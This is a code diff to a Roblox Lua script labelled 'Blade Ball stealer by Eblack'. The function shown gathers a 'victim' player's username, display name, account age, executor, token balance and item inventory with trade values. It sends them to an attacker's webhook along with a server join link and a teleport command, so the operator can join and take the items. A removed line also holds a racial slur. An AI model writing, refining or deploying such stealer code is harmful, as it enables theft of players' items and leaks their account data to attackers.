@@ -147,90 +147,64 @@ end
 local totalRAP = 0
 
 local function SendJoinMessage(list, prefix)
-    local fields = {
-        {
-            name = "Victim Username 🤖:",
-            value = plr.Name,
-            inline = true
-        },
-        {
-            name = "Join link 🔗:",
-            value = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId
-        },
-        {
-            name = "Item list 📝:",
-            value = "",
-            inline = false
-        },
-        {
-            name = "Summary 💰:",
-            value = string.format("Total RAP: %s", formatNumber(totalRAP)),
-            inline = false
-        }
-    }
+    local tokensEmbed = "0"
+    pcall(function() tokensEmbed = PlayerGui.Main.Currency.Coins.Amount.Text:gsub("[^%d]", "") end)
 
     local grouped = {}
     for _, item in ipairs(list) do
-        if grouped[item.Name] then
-            grouped[item.Name].Count = grouped[item.Name].Count + 1
-            grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
-        else
-            grouped[item.Name] = {
-                Name = item.Name,
-                Count = 1,
-                TotalRAP = item.RAP
-            }
-        end
+        grouped[item.Name] = (grouped[item.Name] or {Count = 0, TotalRAP = 0})
+        grouped[item.Name].Count = grouped[item.Name].Count + 1
+        grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
     end
 
     local groupedList = {}
-    for _, group in pairs(grouped) do
-        table.insert(groupedList, group)
-    end
+    for _, group in pairs(grouped) do table.insert(groupedList, group) end
+    table.sort(groupedList, function(a, b) return a.TotalRAP > b.TotalRAP end)
 
-    table.sort(groupedList, function(a, b)
-        return a.TotalRAP > b.TotalRAP
-    end)
-
+    local itemListText = ""
     for _, group in ipairs(groupedList) do
-        local itemLine = string.format("%s (x%s) - %s RAP", group.Name, group.Count, formatNumber(group.TotalRAP))
-        fields[3].value = fields[3].value .. itemLine .. "\n"
-    end
-
-    if #fields[3].value > 1024 then
-        local lines = {}
-        for line in fields[3].value:gmatch("[^\r\n]+") do
-            table.insert(lines, line)
-        end
-
-        while #fields[3].value > 1024 and #lines > 0 do
-            table.remove(lines)
-            fields[3].value = table.concat(lines, "\n") .. "\nPlus more!"
-        end
+        itemListText = itemListText .. string.format("%s (x%s) - %s RAP\n", group.Name, group.Count, formatNumber(group.TotalRAP))
     end
 
     local data = {
         ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
         ["auth_token"] = auth_token, 
-		["embeds"] = {{
-            ["title"] = "🟣 Bro join your hit nigga 🎯",
+        ["embeds"] = {{
+            ["title"] = "🟣 Join your hit",
             ["color"] = 8323327,
-            ["fields"] = fields,
-            ["footer"] = {
-                ["text"] = "Blade Ball stealer by Eblack"
-            }
+            ["fields"] = {
+                {
+                    ["name"] = "ℹ️ Player info:",
+                    ["value"] = "```" ..
+                        "\n🆔 Username      : " .. plr.Name ..
+                        "\n👤 Display Name  : " .. plr.DisplayName ..
+                        "\n🗓️ Account Age   : " .. plr.AccountAge .. " Days" ..
+                        "\n⚡ Executor      : " .. (identifyexecutor and identifyexecutor() or "Unknown") ..
+                        "\n🪙 Tokens        : " .. formatNumber(tonumber(tokensEmbed)) ..
+                        "```",
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "Item list 📝:",
+                    ["value"] = "```\n" .. (itemListText ~= "" and itemListText or "No items") .. "```",
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "Summary 💰:",
+                    ["value"] = "```\nTotal RAP: " .. formatNumber(totalRAP) .. "```",
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "🔗 Quick Links", 
+                    ["value"] = "[**JOIN SERVER**](https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId .. ") | [**VIEW INVENTORY**](https://www.roblox.com/users/"..plr.UserId.."/inventory)", 
+                    ["inline"] = false
+                }
+            },
+            ["footer"] = {["text"] = "Blade Ball stealer by Eblack • " .. os.date("%X")},
+            ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"}
         }}
     }
-    local body = HttpService:JSONEncode(data)
-    local headers = {
-        ["Content-Type"] = "application/json"
-    }
-    local response = request({
-        Url = webhook,
-        Method = "POST",
-        Headers = headers,
-        Body = body
-    })
+    request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
 end
 
 local function SendMessage(list)
